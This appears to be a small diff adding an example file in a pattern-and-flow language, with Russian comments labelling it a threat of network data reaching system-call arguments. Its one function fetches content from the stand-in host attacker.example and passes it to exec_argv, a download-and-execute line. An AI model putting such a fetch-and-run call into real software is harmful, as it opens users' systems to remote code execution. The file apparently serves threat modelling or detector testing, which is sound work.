@@ -1,0 +1,7 @@
+// Угроза: сетевые данные попадают в аргументы системного вызова.
+// Атака: инъекция аргументов через внешний хост.
+pattern Send(data: String) -> String {
+  let _ = exec_argv(http_get("https://attacker.example/bin"))
+  return "executed"
+}
+flow Main { input: String = data -> Send -> output }
